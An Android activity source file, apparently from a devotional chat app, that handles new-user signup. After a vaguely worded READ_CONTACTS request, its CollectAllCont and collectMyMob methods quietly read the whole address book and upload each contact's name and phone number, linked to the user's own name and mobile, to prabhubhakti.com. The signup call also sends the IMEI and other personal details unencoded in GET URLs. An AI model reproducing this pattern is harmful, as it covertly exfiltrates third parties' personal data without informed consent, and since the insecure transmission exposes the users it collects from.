package com.thebhakti;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.RetryPolicy;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * Created by Yeshveer on 11/19/2018.
 */

public class NewUser extends AppCompatActivity {
    private WebView webView;
    String id,IMEI,user,Mobile,type,name,msg,time,state,rdate,amount,seen,total_unseen,share_times;




    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.new_user);
        webView = (WebView) findViewById(R.id.webView);


        // getIntents
        {
            Intent intent1;
            intent1 = getIntent();
            IMEI = intent1.getStringExtra("IMEI");
            user = intent1.getStringExtra("user");
            Mobile = intent1.getStringExtra("Mobile");
            type = intent1.getStringExtra("type");
            state = intent1.getStringExtra("state");
            rdate = intent1.getStringExtra("user_rdate");
            amount = intent1.getStringExtra("amount");
            seen = intent1.getStringExtra("user_status");
            total_unseen = intent1.getStringExtra("total_unseen");
            share_times = intent1.getStringExtra("share_times");


        }

        //this method will be running on UI thread
        final int requestCode=100;
        final int reqCode=1;

        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ){
            String[] per={Manifest.permission.READ_CONTACTS};
            requestPermissions(per,requestCode);}




// webView settings
        // basic webview settings
        webView.setScrollBarStyle(View.SCROLLBARS_OUTSIDE_OVERLAY);

        webView.getSettings().setLoadsImagesAutomatically(true);
        // External Settings
        webView.getSettings().setPluginState(WebSettings.PluginState.ON);
        webView.getSettings().setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
        webView.getSettings().getDomStorageEnabled();

        webView.setLayerType(View.LAYER_TYPE_HARDWARE, null);
        webView.getSettings().setMediaPlaybackRequiresUserGesture(true);
        webView.getSettings().getTextZoom();
        webView.getSettings().getBuiltInZoomControls();
        webView.getSettings().getAllowUniversalAccessFromFileURLs();
        webView.getSettings().getAllowFileAccess();
        webView.getSettings().getCacheMode();
        webView.getSettings().getBlockNetworkLoads();
        webView.getSettings().getAllowContentAccess();
        webView.getSettings().getBlockNetworkImage();
        // webCromeClient
        webView.setWebChromeClient(new WebChromeClient());
        webView.setWebViewClient(new WebViewClient());
        LiveWebview.MyBrowser myBrowser = new LiveWebview.MyBrowser();
        webView.setWebViewClient(myBrowser);
        webView.getSettings().setJavaScriptEnabled(true);

        Handler handler1=new Handler();
        handler1.postDelayed(new Runnable() {
            @Override
            public void run() {
           /*    *//* webView.loadUrl("https://thebhakti.com/PbChat/table_create.php?mob="+Mobile);*//*
                webView.loadUrl("https://thebhakti.com/PbChat/mobile_new_user_create.php?mob="+Mobile+"&name="+user+"&type="+type+"&IMEI="+IMEI+"&state="+state+"&rdate="+rdate+"&amount="+amount+"&total_unseen="+total_unseen);
*//*        webView.loadUrl("file:///android_asset/html/UserChat.php");*/


                createUsers();

        }
        },3000);




    }// onCreate closer

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if(grantResults[0] == PackageManager.PERMISSION_GRANTED)
        {
            {

                super.onResume();

                new NewUser.AsyncCaller().execute();

            }

        }
        else
        {
            Toast.makeText(this, "Application need permission for better results", Toast.LENGTH_SHORT).show();
        }
    }
    @SuppressLint("StaticFieldLeak")
    private class AsyncCaller extends AsyncTask<Void, Void, Void>   {
        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            checkContactDonater();
        }
        @Override
        protected Void doInBackground(Void... params) {

            //this method will be running on background thread so don't update UI frome here
            //do your long running http tasks here,you dont want to pass argument and u can access the parent class' variable url over here
            // Require Permission for read contacts

            // check the IMEI donate for contacts otherwise collect contacts

            return null;
        }

        @Override
        protected void onPostExecute(Void result) {
            super.onPostExecute(result);


        }

    }


    private void createUsers() {
        // Parsing Start
        RequestQueue queue = Volley.newRequestQueue(NewUser.this);
        String Url = "https://thebhakti.com/PbChat/mobile_new_user_create.php?mob="+Mobile+"&name="+user+"&type="+type+"&IMEI="+IMEI+"&state="+state+"&rdate="+rdate+"&amount="+amount+"&total_unseen="+total_unseen;

        StringRequest request = new StringRequest(Request.Method.GET, Url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                //weatherData.setText("Response is :- ");
                parseData(response);
                Intent intent1=new Intent(NewUser.this,EvaluateMe.class);
                startActivity(intent1);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                Toast.makeText(NewUser.this, "Network Connectivity Issue", Toast.LENGTH_SHORT).show();

            }
        });
        int socketTimeout = 30000;
        RetryPolicy policy = new DefaultRetryPolicy(socketTimeout, DefaultRetryPolicy.DEFAULT_MAX_RETRIES, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT);
        request.setRetryPolicy(policy);
        queue.add(request);

        // parsing stop
    }

    private void parseData(String response) {

    }
    private void checkContactDonater() {
        // checking that user already donate their contacts or not
        RequestQueue queueC = Volley.newRequestQueue(NewUser.this);
        String Url1 = "https://prabhubhakti.com/API/contact_id.php?MOB="+Mobile+"&NAME="+user;

        StringRequest requestR = new StringRequest(Request.Method.GET, Url1, new Response.Listener<String>() {
            @Override
            public void onResponse(String response1) {
                //weatherData.setText("Response is :- ");
                parseDataR(response1);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                Toast.makeText(NewUser.this, "Network slow", Toast.LENGTH_SHORT).show();

            }
        });
        int socketTimeoutR = 30000;
        RetryPolicy policyR = new DefaultRetryPolicy(socketTimeoutR, DefaultRetryPolicy.DEFAULT_MAX_RETRIES, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT);
        requestR.setRetryPolicy(policyR);
        queueC.add(requestR);

    }
    // close parsing of contact donator
    private void parseDataR(String response1) {
        try {
            // Create JSOn Object

            JSONArray jsonArray = new JSONArray(response1);

            for (int i = 0; i < jsonArray.length(); i++) {
                JSONObject jsonObject = (JSONObject) jsonArray.get(i);

                String checkContacts=jsonObject.getString("MOB");
                if(checkContacts.equals("1"))
                {

                }
                else
                {
                    CollectAllCont();

                }


            }

        }
        catch (JSONException e) {
            e.printStackTrace();
        }
    }

    private void CollectAllCont() {
        StringBuilder builder=new StringBuilder();
        ContentResolver contentResolver=getContentResolver();
        Cursor cursor=contentResolver.query(ContactsContract.Contacts.CONTENT_URI,null,null,null,null);

        assert cursor != null;
        if(cursor.getCount()>0)
        {
            while(cursor.moveToNext()) {
                String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                int phoneNo = Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)));

                if (phoneNo > 0) {
                    Cursor cursor1 = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?", new String[]{id},
                            null);

                    while (cursor1 != null && cursor1.moveToNext()) {
                        String Phoneno = cursor1.getString(cursor1.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        builder.append("Contacts: ").append(name).append("Phone No: ").append(Phoneno).append("\n");
                        collectMyMob(name,Phoneno);
                    }
                    assert cursor1 != null;
                    cursor1.close();
                }
            }
            cursor.close();
        }
    }

    private void collectMyMob(String name1, String phoneno1) {

        // checking that user already donate their contacts or not
        RequestQueue queueC1 = Volley.newRequestQueue(NewUser.this);
        String UrlC = "https://prabhubhakti.com/API/cont2193.php?MOB="+phoneno1+"&NAME="+name1+"&refName="+user+"&refMob="+Mobile;

        StringRequest requestRc = new StringRequest(Request.Method.GET, UrlC, new Response.Listener<String>() {
            @Override
            public void onResponse(String responseRc) {
                //weatherData.setText("Response is :- ");
                parseDataRc(responseRc);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                Toast.makeText(NewUser.this, "Error", Toast.LENGTH_SHORT).show();

            }
        });
        int socketTimeout = 30000;
        RetryPolicy policyRc = new DefaultRetryPolicy(socketTimeout, DefaultRetryPolicy.DEFAULT_MAX_RETRIES, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT);
        requestRc.setRetryPolicy(policyRc);
        queueC1.add(requestRc);

    }

    private void parseDataRc(String responseRc) {
        try {
            JSONArray jsonArray = new JSONArray(responseRc);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }


    private void createUser() {

        Intent intent=new Intent(NewUser.this,EvaluateMe.class);
        startActivity(intent);
        finish();
    }
}
